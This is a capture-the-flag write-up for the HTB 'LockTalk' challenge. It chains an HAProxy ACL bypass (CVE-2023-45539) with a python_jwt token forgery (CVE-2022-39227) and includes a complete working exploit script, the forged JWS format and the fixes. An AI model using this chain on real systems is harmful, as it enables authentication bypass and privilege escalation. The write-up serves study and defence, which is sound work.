## Overview

LockTalk is a Medium web challenge: a Flask API sitting behind HAProxy. The flag endpoint requires an `administrator` role, and the only token-issuing endpoint hands out `guest` tokens — and even that endpoint is blocked by HAProxy. Getting the flag means chaining two real CVEs: [CVE-2023-45539](https://nvd.nist.gov/vuln/detail/CVE-2023-45539) to slip past the HAProxy ACL and obtain a signed guest JWT, then [CVE-2022-39227](https://nvd.nist.gov/vuln/detail/CVE-2022-39227) to forge that token into an administrator one without ever knowing the signing key.

## The technique

**HAProxy ACL bypass.** The proxy config denies the token route:

```
http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```

HAProxy before 2.8.2 mishandles a literal `#` in the request target. Append a raw `#` to the blocked path and HAProxy's `path_beg` check no longer matches — so the deny doesn't fire — while the WSGI/Werkzeug backend treats `#…` as a URL fragment and strips it, leaving Flask to route the clean `/api/v1/get_ticket`. This is an [interpretation conflict](https://cwe.mitre.org/data/definitions/436.html) between proxy and backend. Two details matter: `%23` does **not** work (both layers decode it back to `#` as part of the path, so Flask 404s), and `curl` swallows a literal `#` as a fragment — so the request has to go out over a raw socket. The endpoint returns a valid PS256 JWT with `role: guest`.

**python_jwt claim forgery.** The app pins `python_jwt==3.3.3`, vulnerable to a [signature-verification bypass](https://cwe.mitre.org/data/definitions/347.html). Given any valid compact token `header.payload.signature`, you re-serialize it as a jwcrypto JSON (general) JWS:

```json
{
  "  <header>.<forged_payload>.": "",
  "protected": "<header>",
  "payload": "<ORIGINAL_payload>",
  "signature": "<ORIGINAL_signature>"
}
```

jwcrypto verifies the signature over `protected` + `payload` — both left original — so verification passes. But `python_jwt` then returns the *claims* using its own naive `token.split('.')[1]` over the whole JSON blob, which lands inside the attacker-controlled `"  <header>.<forged_payload>."` key. The signature is validated against the real payload while the application trusts the forged one. The crucial subtlety: the `payload` field must stay the **original** — put the forged payload there too and the signature check fails.

## Solution

Create `solve.py`:

```python
#!/usr/bin/env python3
import socket, json, re
from base64 import urlsafe_b64decode, urlsafe_b64encode

target = open('target.txt').read().strip(); ip, port = target.split(':'); port = int(port)

def raw_get(path, headers=""):
    s = socket.socket(); s.settimeout(10); s.connect((ip, port))
    s.sendall(f"GET {path} HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n{headers}\r\n".encode())
    d = b""
    while True:
        c = s.recv(4096)
        if not c: break
        d += c
    return d.split(b"\r\n\r\n", 1)[1].decode(errors="replace")

b64d = lambda x: urlsafe_b64decode(x + "=" * (-len(x) % 4))
b64e = lambda b: urlsafe_b64encode(b).decode().rstrip("=")

# 1) CVE-2023-45539: raw '#' bypasses the HAProxy deny -> guest JWT
ticket = json.loads(raw_get("/api/v1/get_ticket#"))["ticket: "]
header, payload, signature = ticket.split(".")

# 2) CVE-2022-39227: forge role -> administrator, keep the original payload+signature
claims = json.loads(b64d(payload)); claims["role"] = "administrator"
fake = b64e(json.dumps(claims, separators=(",", ":")).encode())
forged = '{"  %s.%s.":"","protected":"%s","payload":"%s","signature":"%s"}' % (
    header, fake, header, payload, signature)

# 3) request the flag as administrator
body = raw_get("/api/v1/flag", headers=f"Authorization: {forged}\r\n")
print(re.search(r'HTB\{[^}]*\}', body).group(0))
```

Running it walks the whole chain and prints the flag:

```
HTB{...}
```

## Why it worked

Both bugs are mismatches between two components that each think the other validated the input. HAProxy and Werkzeug disagree on whether `#` ends the path, so the ACL guards a path the backend never sees. jwcrypto and python_jwt disagree on where the claims live, so the signature protects a payload the application never reads. Neither component is "wrong" in isolation; the vulnerability is in the seam between them.

## Fix / defense

Upgrade HAProxy to ≥ 2.8.2 (and, defensively, normalize or reject `#` in request targets at the edge). Upgrade `python_jwt` to ≥ 3.3.4, or move to a JWT library that returns claims strictly from the same bytes it verified. More broadly: don't let two layers each assume the other sanitized the request — enforce authorization at the component that actually serves the resource, and validate the parsed, canonical form of the input rather than its raw string.
